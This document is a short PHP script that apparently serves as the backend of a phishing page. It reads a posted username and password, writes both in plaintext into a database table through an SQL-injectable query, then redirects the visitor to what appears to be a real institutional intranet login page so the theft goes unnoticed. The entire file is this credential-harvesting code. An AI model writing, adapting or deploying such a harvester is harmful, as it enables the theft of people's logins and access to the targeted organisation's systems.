<?php

require 'dbConnection.php';

$name = $_POST['user'];
$password = $_POST['pass'];

#echo "User: " . $name . " | Password: " . $password;

$sql = "INSERT INTO userdata (username, password) VALUES ('$name', '$password')";

if ($conn->query($sql) === TRUE) {
    #echo "New record created successfully";
} else {
    #echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();

header("Location: https://intranet.bib.de/tiki-login.php");
